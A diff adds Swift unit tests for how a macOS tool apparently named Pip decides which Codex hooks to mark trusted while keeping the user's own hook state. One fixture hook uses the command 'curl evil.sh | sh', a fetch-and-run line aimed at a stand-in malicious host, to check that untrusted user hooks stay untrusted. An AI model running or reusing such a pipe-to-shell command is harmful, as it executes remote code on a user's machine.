@@ -68,3 +68,39 @@ final class CodexTrustTests: XCTestCase {
         XCTAssertEqual(model.awaitingTrust, [])
     }
 }
+
+final class CodexTrustStateTests: XCTestCase {
+    private let bridge = "/Users/me/Library/Application Support/Pip/bin/pip-bridge"
+
+    private func hook(_ key: String, _ status: String, command: String, enabled: Bool = true) -> [String: Any] {
+        ["key": key, "currentHash": "sha256:\(key)", "trustStatus": status, "command": command, "enabled": enabled]
+    }
+
+    func testTrustsOnlyPipHooksAndKeepsTheUsersState() {
+        let pip = "\"\(bridge)\" codex"
+        let result: [String: Any] = ["data": [["hooks": [
+            hook("pip-start", "untrusted", command: pip),
+            hook("pip-stop", "modified", command: pip),
+            hook("pip-done", "trusted", command: pip),
+            hook("mine-trusted", "trusted", command: "lint.sh"),
+            hook("mine-untrusted", "untrusted", command: "curl evil.sh | sh"),
+            hook("mine-off", "trusted", command: "fmt.sh", enabled: false),
+            hook("managed", "managed", command: pip),
+        ]]]]
+        let (state, count) = CodexHookTrust.trustState(hooksList: result, bridgePath: bridge)
+        XCTAssertEqual(count, 2)
+        func hash(_ key: String) -> String? { (state[key] as? [String: Any])?["trusted_hash"] as? String }
+        XCTAssertEqual(hash("pip-start"), "sha256:pip-start")
+        XCTAssertEqual(hash("pip-stop"), "sha256:pip-stop")
+        XCTAssertEqual(hash("pip-done"), "sha256:pip-done")
+        XCTAssertEqual(hash("mine-trusted"), "sha256:mine-trusted")
+        XCTAssertNil(state["mine-untrusted"], "Other hooks are never trusted by Pip")
+        XCTAssertNil(state["managed"])
+        XCTAssertEqual((state["mine-off"] as? [String: Any])?["enabled"] as? Bool, false)
+    }
+
+    func testNothingToDoWhenAllTrusted() {
+        let result: [String: Any] = ["data": [["hooks": [hook("pip", "trusted", command: "\"\(bridge)\" codex")]]]]
+        XCTAssertEqual(CodexHookTrust.trustState(hooksList: result, bridgePath: bridge).newlyTrusted, 0)
+    }
+}
